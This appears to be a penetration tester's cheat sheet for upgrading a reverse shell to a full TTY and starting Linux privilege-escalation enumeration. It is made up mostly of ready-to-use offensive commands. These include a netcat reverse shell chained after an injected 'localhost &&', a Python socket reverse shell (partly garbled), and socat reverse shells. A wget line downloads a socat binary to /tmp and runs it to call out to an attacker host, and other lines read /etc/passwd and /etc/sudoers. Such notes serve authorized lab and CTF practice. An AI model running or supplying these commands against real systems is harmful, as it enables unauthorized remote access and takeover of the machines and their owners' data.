
Useful links:
[https://gtfobins.github.io/](https://gtfobins.github.io/)

Upgrading to full TTY

```
Upgrade TTY Linux

Once you have the upgrade, Ctrl+Z, stty raw -echo; fg; reset

check tty shell

tty

/dev/pts/0

localhost && nc 10.10.0.1 1234 -e /bin/bash

python -c 'import pty; pty.spawn("/bin/sh")'

python3 -c 'import pty; pty.spawn("/bin/sh")'

python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(), *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

socat [file:`tty`,raw,echo=0](file://%60tty%60,raw,echo=0) tcp-listen:5555

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:5555

wget -q [https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat); chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:4444

CTRL + Z

echo $TERM

Make a note of Kali term type

xterm-256color

Make a note of the number of rows and columns. Next, enter the following command which will allow us to pass keyboard shortcuts through.

stty -a

stty raw -echo

fg

reset

xterm

If you can't clear the screen or use the up arrow to view history at this point, use the following commands to set the terminal type and shell once more.

export TERM=xterm

export SHELL=bash

stty rows 27 columns 129
```

Basics

```
id

whoami

sudo -l

su root

sudo -i
```

Check users

```
cat /etc/passwd

cat /etc/sudoers
```

